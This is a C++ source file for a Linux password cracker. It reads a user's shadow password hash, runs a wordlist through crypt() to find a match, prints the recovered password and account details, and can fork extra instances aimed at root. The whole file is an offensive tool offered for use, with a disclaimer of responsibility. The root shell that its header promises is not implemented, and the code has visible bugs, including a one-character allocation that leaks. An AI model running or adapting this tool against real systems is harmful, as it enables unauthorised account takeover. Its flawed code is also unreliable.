/**********************************************************************************
 * This program uses a dictionary attack to bruteforce into a linux user account. *
 * If root password is aquired user is prompted to launch a root shell.           *
 *                                                                                *
 * I am not held responsible for any person who uses this code fo the wrong       *
 * reasons.                                                                       *
 *                                                                                *
 * ~3L173                                                                         *
 **********************************************************************************/

// Macros
#define _XOPEN_SOURCE
#define _BSD_SOURCE

// ANSI Excape Macros
#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define NF      "\033[0m"
#define CLRLN   "\033[2K"
#define CUP     "\033[1A"
#define CLRSCRN "\033[2J\033[1;1H"

// Headers
#include <cstdlib>
#include <iostream>
#include <fstream>
#include <iomanip>
#include <cstdio>
#include <ctime>
#include <cerrno>
#include <cstring>
#include <string>
#include <thread>
#include <limits>

#include <sys/times.h>
#include <pwd.h>
#include <shadow.h>
#include <unistd.h>
#include <signal.h>

// Global Statics
static bool auth = false;

// Functions
bool promptYN(const std::string reply);
int  displayTime();
void gotoLine(std::ifstream &ifs, unsigned line);
void callBrute(const struct passwd* const pwd, const struct spwd* const spwd,
               const char* const path, const unsigned ln, const unsigned id);

// Start Main
int main(int argc, char *argv[]) {
    // Check Arguments
    if(argc < 5 || std::atoi(argv[3]) <= 0 || std::atoi(argv[4]) < 0 || std::atoi(argv[4]) > 2 ||
       std::strcmp(argv[1], "-h") == 0) {
        std::cerr << YELLOW << "\nUsage:     " << argv[0]
                            << " [passFile path] [username] [lnOffset] [spawns]"
                            << "\nSemantics: lnOffset > 0, spawns >= 0 and <= 2\n\n" << NF;
        return EXIT_FAILURE;
    }

    // Set Arguments
    const char* const   PATH  = argv[1];
    const char* const   USER  = argv[2];
    const unsigned long LN    = std::atol(argv[3]);
    const unsigned      SPAWN = std::atoi(argv[4]);

    // Declarations
    char *user = NULL;
    struct passwd *pwd = NULL;
    struct spwd *spwd = NULL;
    std::size_t len = 0;
    long lnmax = 0;

    // Sleep for Verbose
    if(SPAWN == 0)
        if(sleep(1) != 0)
            std::cerr << YELLOW << "\Error, sleep()\n" << NF;
    else if(SPAWN == 1 || SPAWN == 2)
        if(sleep(2) != 0)
            std::cerr << YELLOW << "\Error, sleep()\n" << NF;

    // Get Max Username Allowed   
    errno = 0;
    if((lnmax = sysconf(_SC_LOGIN_NAME_MAX)) == -1) {
        std::perror("\n\033[0m_SC_LOGIN_NAME_MAX, guessing 256\033[1;33m");
        lnmax = 256; // if indeterminate, guess on size
    }
    else
        if(errno == 0) { // limit indeterminate
            std::perror("\033[0m\n_SC_LOGIN_NAME_MAX, guessing 256\033[1;33m");
            lnmax = 256; // if indeterminate, guess on size
        }
    std::cout << NF;
    std::fflush(stdout);

    // Sleep for Verbose
    if(sleep(1) != 0)
            std::cerr << YELLOW << "\Error, sleep()\n" << NF;

    // Allocate User Space
    if(!(user = new char(lnmax))) {
        std::cerr << "\nnew Allocation Error\n";
        return EXIT_FAILURE;
    }

    // Get Username from Arg
    user = const_cast<char*>(USER);

    // Get Length, Remove Trailing Newline If Need
    len = std::strlen(user);
    if(user[len-1] == '\n')
        user[len-1] = '\0';

    // Get User Passwd
    if(!(pwd = getpwnam(user))) {
        std::cerr << "\nCould'nt get password record.\n";
        return EXIT_FAILURE;
    }
    std::cout << "Getting Pass: " << GREEN << "Success" << NF;
    std::fflush(stdout);

    // Sleep for Verbose
    if(sleep(1) != 0)
        std::cerr << YELLOW << "\Error, sleep()\n" << NF;

    // Get User Shadow Passwd
    if(!(spwd = getspnam(user)) && errno == EACCES) {
        std::perror("\ngetspnam(): No permission to read shadow file");
        sleep(3); // sleep for verbose
        return EXIT_FAILURE;
    }
    std::cout << "\nGetting Shadow Pass: " << GREEN << "Success" << NF;
    std::fflush(stdout);
    
    // Sleep for Verbose
    if(sleep(1) != 0)
        std::cerr << YELLOW << "\Error, sleep()\n" << NF;
    
    // Use If Shadow File Exists
    if(spwd)
        pwd->pw_passwd = spwd->sp_pwdp;

    // Verbose
    std::cout << "\nOpenning Dictionary: " << GREEN << "Success\n" << NF;
    std::fflush(stdout);

    // Sleep for Verbose
    if(sleep(1) != 0)
        std::cerr << YELLOW << "\Error, sleep()\n" << NF;

    // Fork Brutes
    if(SPAWN == 1) {
        pid_t pid = fork();
        if(pid == -1)
            std::perror("fork");
        else if(!pid) {
            int ret = execl("/bin/sh", "sh", "-c", "/home/newuser/Desktop/kraker/crkr passwords.txt root 7000 0 1", (char*)NULL);
            if(ret == -1)
                std::perror("execl");
            std::cout << "\nfork()ing a second Bruteforcer: " << GREEN << "Success\n\n" << NF;           
        }
    }
    else if(SPAWN == 2) {
        pid_t pid = fork();
        if(pid == -1)
            std::perror("fork");
        else if(!pid) {
            int ret = execl("/bin/sh", "sh", "-c", "/home/newuser/Desktop/kraker/crkr passwords.txt root 750000 0 1", (char*)NULL);
            if(ret == -1)
                std::perror("execl");
            std::cout << "\nfork()ing a second Bruteforcer: " << GREEN << "Success\n\n" << NF;           
        }
        std::fflush(stdout);
       
        // Sleep for Verbose
        if(sleep(5) != 0)
            std::cerr << YELLOW << "\Error, sleep()\n" << NF;

        pid_t pid2 = fork();
        if(pid2 == -1)
            std::perror("fork");
        else if(!pid2) {
            int ret2 = execl("/bin/sh", "sh", "-c", "/home/newuser/Desktop/kraker/crkr passwords.txt root 1500000 0 2", (char*)NULL);
            if(ret2 == -1)
                std::perror("execl");
            std::cout << "\nfork()ing a third Bruteforcer: " << GREEN << "Success\n\n" << NF;           
        }
    }
    std::fflush(stdout);
    
    // Sleep for Verbose
    if(sleep(1) != 0)
        std::cerr << YELLOW << "\Error, sleep()\n" << NF;

    // Multi-Thread Dictionary Bruteforce
    if(argv[5]) {
        const unsigned ID = std::atoi(argv[5]);
        callBrute(pwd, spwd, PATH, LN, ID);
    }
    else if(!argv[5])
        callBrute(pwd, spwd, PATH, LN, 99);

    // Check Auth
    if(!auth)
        std::cout << "Authentication: " << RED << "Denied, Brutefore Unsuccessful\n" << NF;

    // Display Process User Time/Kernel Time
    if(displayTime() == -1)
        std::cerr << YELLOW << "\nError, displayTime()" << NF;

    // Verbose
    std::cout << "\nCleaning Up: " << GREEN << "Success\n" << NF;
    std::fflush(stdout);

    // Kill Parent and Children
    if(kill(0, 15) == -1) {
        std::perror("kill");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
} // End Main

// Function Implementations
bool promptYN(const std::string reply) {
	if	   (reply == "YES"		 || reply == "Yes"		 || reply == "yes"		 ||
		    reply == "SURE"		 || reply == "Sure"		 || reply == "sure"		 ||
		    reply == "OK"		 || reply == "Ok"		 || reply == "ok"		 ||
		    reply == "Y"		 || reply == "y")
		    return true;
	else if(reply == "NO"        || reply == "No"		 || reply == "no"		 ||
		    reply == "QUIT"      || reply == "Quit"		 || reply == "quit"		 ||
			reply == "STOP"      || reply == "Stop"		 || reply == "stop"		 ||
			reply == "TERMINATE" || reply == "Terminate" || reply == "terminate" ||
			reply == "N"		 || reply == "n")
			return false;
	else
			return true;
}

int displayTime() {
    struct tms t;
    std::clock_t ct;
    static long cticks = sysconf(_SC_CLK_TCK); // get clock tick cycle
    if(cticks == -1) {
        std::cerr << "\nError, sysconf(_SC_CLK_TCK)";
        return -1;
    }

    // Fill ct
    if((ct = std::clock()) == -1) {
        std::cerr << YELLOW << "\nError, clock()" << NF;
        return -1;
    }
    
    // Output
    std::cout << std::showpoint << std::fixed << std::setprecision(2)
              << "\nCPU Time in Clock Ticks for Process: " << ct
              << "\nCPU Time: ";
        
    float sec = ct / CLOCKS_PER_SEC;
    if(sec < 60)
        std::cout << sec << " seconds\n\n";
    else
        std::cout << sec / 60 << " minutes\n\n";

    return EXIT_SUCCESS;
}

void gotoLine(std::ifstream &ifs, unsigned line) {
    ifs.seekg(std::ios::beg);
    for(unsigned i = 0; i < line-1; ++i)
        ifs.ignore(std::numeric_limits<std::streamsize>::max(),'\n');
}

void callBrute(const struct passwd* const pwd, const struct spwd* const spwd,
               const char* const path, const unsigned ln, const unsigned id) {
    // Declarations
    char *encrypt = NULL, *p = NULL;
    std::string pass, str = "\nBruteforcing...";
    

    // Open File Dictionary
    std::ifstream ifs(path);
    if(!ifs)
        std::cerr << "\nError, openning file for reading\n";

    // Set File Offset
    gotoLine(ifs, ln);
    
    // Sleep for Verbose
    if(id == 2)
        if(sleep(6) != 0)
            std::cerr << YELLOW << "\Error, sleep()\n" << NF;
    
    if(sleep(4) != 0)
        std::cerr << YELLOW << "\Error, sleep()\n" << NF;

    std::cout << std::endl;

    // Loop Dictionary Attack   
    while(ifs.good() && ifs.peek() != EOF && !auth) {
        // Output Verbose str
        if(id == 99) {
            if((str.size()-14) == 11)
                str = "\nBruteforcing...";
            std::cout << CLRLN << CUP << GREEN << str << NF;
            str += '.';
            std::fflush(stdout);
        }

        // Get Line and Encrypt
        std::getline(ifs, pass, '\n');
        encrypt = crypt(pass.c_str(), pwd->pw_passwd);

        // Disable Pass Echoing
        //for(p = const_cast<char*>(pass.c_str()); *p != '\0'; *p++ = '\0');

        // Check Encryption Successful
        if(!encrypt)
            std::cerr << "\ncrypt() " << RED << "error\n" << NF;

        // Compare Encrpt Pass and Output
        if((auth = std::strcmp(encrypt, pwd->pw_passwd) == 0))
            std::cout << "\nAuthentication: "   << GREEN << "Granted, Brutefore Successful"
                      << "\n\n*Passwd File*"  << NF    
                      << "\nLogin Name:     " << pwd->pw_name
                      << "\nEncrypted Pass: " << pwd->pw_passwd
                      << "\nUser ID:        " << pwd->pw_uid
                      << "\nGroup ID:       " << pwd->pw_gid
                      << "\nComment:        " << pwd->pw_gecos
                      << "\nHome Dir:       " << pwd->pw_dir
                      << "\nLogin Shell:    " << pwd->pw_shell
                      << GREEN << "\n\nPassword:       " << pass << NF
                      << "\n\n";
    }
    sleep(5); // sleep for verbose

    // Close Dictionary File
    ifs.close();
}

